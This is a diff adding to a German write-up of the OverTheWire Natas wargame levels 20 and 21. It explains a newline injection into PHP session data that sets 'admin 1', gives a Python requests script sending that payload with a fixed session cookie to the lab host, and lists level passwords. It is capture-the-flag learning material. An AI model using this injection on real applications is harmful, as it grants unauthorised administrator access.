@@ -456,3 +456,27 @@ for i in sessions:
 Zugriff:	[http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
 Username: `natas20`
 Passwort: `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF  `
+
+Explode kann ausgenutzt werden. `\n` wird dazu genutzt, `admin=1` zu erzeugen.
+
+```python
+import requests
+
+auth_user = "natas20"
+auth_password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
+url = "http://natas20.natas.labs.overthewire.org/?debug"
+data = {'name':'\nadmin 1'}
+cookies = {'PHPSESSID': 'frtgeub0ptgojm5bvs2bovo7g6'}
+
+r = requests.post(url, auth=(auth_user, auth_password), data=data, cookies=cookies)
+r2 = requests.get(url, auth=(auth_user, auth_password), cookies=cookies)
+print(r2.text)
+```
+
+
+
+# Natas 21
+
+Zugriff:	[http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
+Username: `natas20`
+Passwort: `IFekPyrQXftziDEsUr3x21sYuahypdgJ  `
